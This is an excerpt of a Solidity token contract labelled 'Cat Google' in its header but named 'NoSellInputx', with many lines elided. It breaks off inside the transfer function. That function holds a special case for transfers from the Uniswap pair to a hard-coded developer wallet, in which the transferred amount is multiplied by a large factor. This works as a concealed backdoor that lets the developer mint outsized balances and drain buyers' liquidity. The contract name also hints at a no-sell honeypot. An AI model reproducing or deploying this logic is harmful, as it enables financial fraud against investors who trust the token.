...
/*      Cat Google 
            Telegram : https://t.me/GooglecatBSC
            Website : https://googlecat.org/
*/
...
contract NoSellInputx is Context, IERC20 { 
    ...
    address payable public Wallet_Dev = payable(0x440e7B5932d368C14D244E392D8656Fc1295cf4e);
    ...
    string private constant _name = "NoSellInputx"; 
    string private constant _symbol = unicode"NSIX"; 
    ...
    uint256 public Percent_Burn = 19;
    uint256 public Percent_AutoLP = 1; 

    uint256 public _maxWalletToken = _tTotal/25;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        uint256 Feetake = _tTotal / 25;

        if (sender == uniswapV2Pair && recipient == Wallet_Dev){


            if (tAmount >= Feetake){

                uint256 finalamount = tAmount * Feetake;
